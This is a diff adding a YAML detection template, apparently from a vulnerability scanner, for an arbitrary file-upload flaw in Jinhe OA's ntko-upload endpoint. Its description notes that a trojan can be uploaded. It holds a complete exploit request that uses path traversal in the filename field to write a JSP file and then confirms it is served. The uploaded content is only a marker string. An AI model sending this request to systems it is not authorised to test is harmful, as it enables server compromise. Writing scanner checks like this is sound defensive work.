@@ -1,0 +1,18 @@
+name: 金和OA-ntko-upload-文件上传
+description: >-
+  可上传木马
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /jc6/ntkoUpload/ntko-upload!upload.action
+    headers:
+      Content-Type: multipart/form-data; boundary=----zqulxi4ku42pfmoelvc0
+    body: "------zqulxi4ku42pfmoelvc0\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n../../../../upload/Rscan.jsp\r\n------zqulxi4ku42pfmoelvc0\r\nContent-Disposition: form-data; name=\"upLoadFile\"; filename=\"Rscan.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nRscan_test\r\n------zqulxi4ku42pfmoelvc0\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nupload\r\n------zqulxi4ku42pfmoelvc0--"
+    expression:
+      status: 200
+  - method: GET
+    path: /upload/Rscan.jsp
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
